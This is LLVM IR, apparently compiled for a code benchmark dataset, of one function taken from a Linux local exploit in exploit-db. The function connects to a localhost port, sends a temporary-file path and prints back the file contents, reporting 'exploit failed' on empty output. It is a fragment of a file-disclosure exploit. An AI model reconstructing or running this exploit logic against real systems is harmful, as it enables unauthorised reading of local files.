; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_763.c_fkey_connect.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_763.c_fkey_connect.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.hostent = type { i64 }
%struct.sockaddr_in = type { %struct.TYPE_2__, i32, i32 }
%struct.TYPE_2__ = type { i32 }
%struct.sockaddr = type { i32 }

@AF_INET = common dso_local global i32 0, align 4
@SOCK_STREAM = common dso_local global i32 0, align 4
@IPPROTO_TCP = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [42 x i8] c"[*] attempting to connect: localhost:%u.\0A\00", align 1
@.str.1 = private unnamed_addr constant [10 x i8] c"127.0.0.1\00", align 1
@.str.2 = private unnamed_addr constant [10 x i8] c"localhost\00", align 1
@.str.3 = private unnamed_addr constant [27 x i8] c"couldn't resolve hostname.\00", align 1
@SIGALRM = common dso_local global i32 0, align 4
@sig_alarm = common dso_local global i32 0, align 4
@.str.4 = private unnamed_addr constant [19 x i8] c"connection failed.\00", align 1
@.str.5 = private unnamed_addr constant [43 x i8] c"[*] successfully connected: localhost:%u.\0A\00", align 1
@TMPFILE = common dso_local global i32 0, align 4
@stderr = common dso_local global i32 0, align 4
@.str.6 = private unnamed_addr constant [56 x i8] c"exploit failed, file doesn't exist or zero-length file.\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @fkey_connect(i16 zeroext %0) #0 {
  %2 = alloca i16, align 2
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca [1025 x i8], align 16
  %7 = alloca %struct.hostent*, align 8
  %8 = alloca %struct.sockaddr_in, align 4
  store i16 %0, i16* %2, align 2
  store i32 0, i32* %3, align 4
  store i32 0, i32* %4, align 4
  store i32 0, i32* %5, align 4
  %9 = load i32, i32* @AF_INET, align 4
  %10 = load i32, i32* @SOCK_STREAM, align 4
  %11 = load i32, i32* @IPPROTO_TCP, align 4
  %12 = call i32 @socket(i32 %9, i32 %10, i32 %11)
  store i32 %12, i32* %3, align 4
  %13 = load i32, i32* @AF_INET, align 4
  %14 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 2
  store i32 %13, i32* %14, align 4
  %15 = load i16, i16* %2, align 2
  %16 = call i32 @htons(i16 zeroext %15)
  %17 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 1
  store i32 %16, i32* %17, align 4
  %18 = load i16, i16* %2, align 2
  %19 = call i32 @printf(i8* getelementptr inbounds ([42 x i8], [42 x i8]* @.str, i64 0, i64 0), i16 zeroext %18)
  %20 = call i32 @inet_addr(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.1, i64 0, i64 0))
  %21 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 0
  %22 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %21, i32 0, i32 0
  store i32 %20, i32* %22, align 4
  %23 = icmp ne i32 %20, 0
  br i1 %23, label %24, label %37

24:                                               ; preds = %1
  %25 = call %struct.hostent* @gethostbyname(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.2, i64 0, i64 0))
  store %struct.hostent* %25, %struct.hostent** %7, align 8
  %26 = icmp ne %struct.hostent* %25, null
  br i1 %26, label %29, label %27

27:                                               ; preds = %24
  %28 = call i32 @printe(i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.3, i64 0, i64 0), i32 1)
  br label %29

29:                                               ; preds = %27, %24
  %30 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 0
  %31 = bitcast %struct.TYPE_2__* %30 to i8*
  %32 = load %struct.hostent*, %struct.hostent** %7, align 8
  %33 = getelementptr inbounds %struct.hostent, %struct.hostent* %32, i32 0, i32 0
  %34 = load i64, i64* %33, align 8
  %35 = inttoptr i64 %34 to i8*
  %36 = call i32 @memcpy(i8* %31, i8* %35, i32 4)
  br label %37

37:                                               ; preds = %29, %1
  %38 = load i32, i32* @SIGALRM, align 4
  %39 = load i32, i32* @sig_alarm, align 4
  %40 = call i32 @signal(i32 %38, i32 %39)
  %41 = call i32 @alarm(i32 3)
  %42 = load i32, i32* %3, align 4
  %43 = bitcast %struct.sockaddr_in* %8 to %struct.sockaddr*
  %44 = call i64 @connect(i32 %42, %struct.sockaddr* %43, i32 12)
  %45 = icmp ne i64 %44, 0
  br i1 %45, label %46, label %48

46:                                               ; preds = %37
  %47 = call i32 @printe(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.4, i64 0, i64 0), i32 1)
  br label %48

48:                                               ; preds = %46, %37
  %49 = call i32 @alarm(i32 0)
  %50 = load i16, i16* %2, align 2
  %51 = call i32 @printf(i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str.5, i64 0, i64 0), i16 zeroext %50)
  %52 = load i32, i32* %3, align 4
  %53 = load i32, i32* @TMPFILE, align 4
  %54 = load i32, i32* @TMPFILE, align 4
  %55 = call i32 @strlen(i32 %54)
  %56 = call i32 @write(i32 %52, i32 %53, i32 %55)
  %57 = call i32 @alarm(i32 5)
  %58 = getelementptr inbounds [1025 x i8], [1025 x i8]* %6, i64 0, i64 0
  %59 = call i32 @memset(i8* %58, i32 0, i32 1025)
  br label %60

60:                                               ; preds = %72, %48
  %61 = load i32, i32* %3, align 4
  %62 = getelementptr inbounds [1025 x i8], [1025 x i8]* %6, i64 0, i64 0
  %63 = call i32 @read(i32 %61, i8* %62, i32 1024)
  store i32 %63, i32* %4, align 4
  %64 = icmp ne i32 %63, 0
  br i1 %64, label %65, label %75

65:                                               ; preds = %60
  %66 = getelementptr inbounds [1025 x i8], [1025 x i8]* %6, i64 0, i64 0
  %67 = load i32, i32* @stderr, align 4
  %68 = call i32 @fputs(i8* %66, i32 %67)
  %69 = load i32, i32* %4, align 4
  %70 = load i32, i32* %5, align 4
  %71 = add nsw i32 %70, %69
  store i32 %71, i32* %5, align 4
  br label %72

72:                                               ; preds = %65
  %73 = getelementptr inbounds [1025 x i8], [1025 x i8]* %6, i64 0, i64 0
  %74 = call i32 @memset(i8* %73, i32 0, i32 1025)
  br label %60

75:                                               ; preds = %60
  %76 = call i32 @alarm(i32 0)
  %77 = load i32, i32* %5, align 4
  %78 = icmp sle i32 %77, 0
  br i1 %78, label %79, label %81

79:                                               ; preds = %75
  %80 = call i32 @printe(i8* getelementptr inbounds ([56 x i8], [56 x i8]* @.str.6, i64 0, i64 0), i32 0)
  br label %81

81:                                               ; preds = %79, %75
  %82 = load i32, i32* %3, align 4
  %83 = call i32 @close(i32 %82)
  ret void
}

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i32 @htons(i16 zeroext) #1

declare dso_local i32 @printf(i8*, i16 zeroext) #1

declare dso_local i32 @inet_addr(i8*) #1

declare dso_local %struct.hostent* @gethostbyname(i8*) #1

declare dso_local i32 @printe(i8*, i32) #1

declare dso_local i32 @memcpy(i8*, i8*, i32) #1

declare dso_local i32 @signal(i32, i32) #1

declare dso_local i32 @alarm(i32) #1

declare dso_local i64 @connect(i32, %struct.sockaddr*, i32) #1

declare dso_local i32 @write(i32, i32, i32) #1

declare dso_local i32 @strlen(i32) #1

declare dso_local i32 @memset(i8*, i32, i32) #1

declare dso_local i32 @read(i32, i8*, i32) #1

declare dso_local i32 @fputs(i8*, i32) #1

declare dso_local i32 @close(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
